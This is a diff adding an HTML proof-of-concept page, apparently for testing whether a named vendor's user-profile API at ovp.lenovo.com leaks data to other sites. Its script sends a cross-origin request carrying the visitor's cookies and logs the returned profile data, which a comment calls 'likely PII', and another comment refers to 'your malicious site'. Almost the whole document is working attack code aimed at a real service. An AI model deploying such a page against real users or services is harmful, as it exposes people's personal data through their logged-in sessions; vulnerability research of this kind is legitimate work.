@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Check PoC</title>
+    <script>
+        function makeRequest() {
+            // Perform a GET request to the target API with credentials
+            fetch('https://ovp.lenovo.com/dxp/api/sacs/v1/user/profile', {
+                method: 'GET',
+                headers: {
+                    'Origin': 'https://nayssers.github.io',  // Your malicious site or target domain
+                    'Accept': 'application/json',
+                    'Sec-Fetch-Mode': 'cors',
+                    'Sec-Fetch-Site': 'cross-site',
+                    'Sec-Fetch-Dest': 'empty',
+                },
+                credentials: 'include'  // Ensure cookies are sent with the request
+            })
+            .then(response => {
+                console.log('Response Status:', response.status); // Check if request was successful
+                if (response.status === 200) {
+                    response.json().then(data => {
+                        console.log('Response Data:', data); // Log response data (likely PII)
+                    });
+                } else {
+                    console.error('Request failed or unauthorized');
+                }
+            })
+            .catch(error => {
+                console.error('Error making request:', error); // Catch any errors
+            });
+        }
+    </script>
+</head>
+<body>
+    <h1>Testing CSRF Vulnerability</h1>
+    <p>This page sends a cross-origin request with cookies included to check if it can retrieve user profile data.</p>
+    <button onclick="makeRequest()">Send CSRF-like Request</button>
+</body>
+</html>
